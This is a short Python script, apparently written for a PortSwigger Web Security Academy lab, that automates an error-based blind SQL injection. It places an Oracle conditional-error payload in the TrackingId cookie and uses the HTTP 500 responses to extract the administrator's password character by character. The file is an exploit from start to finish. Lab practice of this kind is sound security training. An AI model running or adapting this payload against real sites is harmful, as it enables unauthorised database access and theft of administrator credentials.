#!/usr/bin/python3

from pwn import *
import requests, signal, time, sys, pdb, string

# Control - C 
def handler(sig, frame):
    print("\n\n[+] Saliendo del archivo\n")
    sys.exit(1)

url_attack = "https://0a46002104d0a224801abc9e00600028.web-security-academy.net"
characters = string.ascii_lowercase + string.digits
length = 20 

def start_attack():
    password = ""
    
    p1 = log.progress("Fuerza bruta")
    p1.status("Inicializando el ataque")

    p2 = log.progress("Password")

    time.sleep(2)

    for element in range(1, length + 1):
        for character in characters:
            
            cookie = {
                    "TrackingId": "O37akYWnRHJ0Jwzs'||(select case when (substr(password, %d, 1) = '%s') then to_char(1/0) else '' end from users where username='administrator')||'" % (element, character),
                    "session": "evI5d96EgAW0hHvQufM4Q4UJYGaLD3EM"
            }

            p1.status(cookie["TrackingId"])

            result = requests.get(url_attack, cookies=cookie)

            #print(result.status_code)

            if result.status_code == 500:
                password += character
                p2.status(password)
                break


signal.signal(signal.SIGINT, handler)


if __name__ == '__main__':
    start_attack()
